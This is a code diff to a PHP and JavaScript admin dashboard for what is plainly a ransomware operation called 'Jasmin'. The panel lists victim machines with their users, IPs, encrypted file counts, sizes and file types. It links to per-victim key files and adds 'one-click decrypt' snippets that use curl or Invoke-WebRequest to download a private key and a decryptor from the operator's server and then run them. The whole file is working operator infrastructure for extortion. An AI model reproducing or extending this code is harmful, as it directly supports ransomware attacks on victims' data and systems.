@@ -113,24 +113,58 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   <button type="submit"><i class="fas fa-search"></i></button>
 </form>
 <div class="table-wrap"><table>
-<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>位置</th><th>日期</th><th>时间</th><th>密钥</th></tr></thead>
+<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>文件类型</th><th>操作</th></tr></thead>
 <tbody>
 <?php if(empty($rows)):?>
-<tr><td colspan="9" class="empty">暂无受害主机数据</td></tr>
+<tr><td colspan="10" class="empty">暂无受害主机数据</td></tr>
 <?php else: foreach($rows as $i=>$row):
-  $sm=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['machine_name']);
-  $su=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['computer_user']);
-  $ss=preg_replace('/[^a-zA-Z0-9_\-]/','_',$row['systemid']);
+  $sm=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['machine_name']);
+  $su=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['computer_user']);
+  $ss=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['systemid']);
   $nt=date("H-i-s",strtotime($row['time']));
   $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
+  $ec=intval($row['encrypted_count']??0);
+  $es=intval($row['encrypted_size']??0);
+  $et=h($row['encrypted_types']??'');
+  if($es>=1073741824)$sz_str=round($es/1073741824,2).' GB';
+  elseif($es>=1048576)$sz_str=round($es/1048576,2).' MB';
+  elseif($es>=1024)$sz_str=round($es/1024,2).' KB';
+  else $sz_str=$es.' B';
+  $vid=$row['id'];
+  $is_linux=(stripos($row['os']??'','linux')!==false||stripos($row['os']??'','darwin')!==false);
 ?>
 <tr>
   <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
   <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
-  <td><?=h($row['ip'])?></td><td><?=h($row['location'])?></td>
-  <td><?=h($row['date'])?></td><td><?=h($row['time'])?></td>
-  <td><?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm"><i class="fas fa-key"></i></a><?php else:?><span class="muted">—</span><?php endif;?></td>
+  <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
+  <td style="color:#f59e0b;font-weight:600"><?=$ec?> 个</td>
+  <td style="color:#4dc3fa"><?=$sz_str?></td>
+  <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
+  <td style="white-space:nowrap">
+    <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
+    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('<?=$vid?>','<?=h($row['ip'])?>',<?=$is_linux?'true':'false'?>)" title="一键解密"><i class="fas fa-unlock"></i></button>
+  </td>
 </tr>
+<?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
+<tr><td colspan="10" id="dec-row-<?=$vid?>" class="dec-expand">
+<?php if($is_linux):?>
+<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
+pip3 install -q cryptography 2>/dev/null
+curl -sL <?=$server_url?>/payloads/jasmin_private.pem -o /tmp/.jk
+curl -sL <?=$server_url?>/payloads/jasmin_decrypt.py -o /tmp/.jd
+python3 /tmp/.jd /tmp/.jk
+rm -f /tmp/.jk /tmp/.jd</pre>
+<?php else:?>
+<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
+$tmp="$env:TEMP\jasmin_dec"
+New-Item -ItemType Directory -Force -Path $tmp | Out-Null
+Invoke-WebRequest "<?=$server_url?>/payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
+Invoke-WebRequest "<?=$server_url?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
+& "$tmp\dec.exe" "$tmp\key.pem"
+Remove-Item -Recurse -Force $tmp</pre>
+<?php endif;?>
+</td></tr>
+<?php endif;?>
 <?php endforeach;endif;?>
 </tbody></table></div>
 <?php if($total_pages>1):?>
@@ -196,6 +230,22 @@ function showTab(t){
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
 }
+var _decOpen=null;
+function showDecrypt(vid,ip,isLinux){
+  var srv=location.origin;
+  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
+  var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
+  if(!tr)return;
+  var nr=document.createElement('tr');nr.dataset.vid=vid;
+  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
+  if(isLinux){
+    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem -o /tmp/.jk\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jk /tmp/.jd</pre>';
+  }else{
+    td.innerHTML='<pre class="dt-code">$tmp="$env:TEMP\\jasmin_dec"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest "'+srv+'/payloads/jasmin_private.pem" -OutFile "$tmp\\key.pem"\nInvoke-WebRequest "'+srv+'/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\\dec.exe"\n& "$tmp\\dec.exe" "$tmp\\key.pem"\nRemove-Item -Recurse -Force $tmp</pre>';
+  }
+  nr.appendChild(td);tr.after(nr);_decOpen=nr;
+}
+
 function genKey(){
   var r=document.getElementById('key-result');
   r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
